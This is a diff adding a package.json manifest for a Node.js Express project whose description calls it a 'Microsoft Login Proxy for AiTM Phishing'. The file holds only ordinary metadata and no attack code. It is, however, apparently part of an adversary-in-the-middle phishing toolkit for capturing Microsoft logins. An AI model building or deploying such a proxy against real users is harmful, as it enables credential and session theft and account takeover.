@@ -1,0 +1,16 @@
+{
+  "name": "aitm-proxy-webapp",
+  "version": "1.0.0",
+  "description": "Microsoft Login Proxy for AiTM Phishing",
+  "main": "webapp-server.js",
+  "scripts": {
+    "start": "node webapp-server.js",
+    "dev": "node webapp-server.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2"
+  },
+  "engines": {
+    "node": "22.x"
+  }
+}
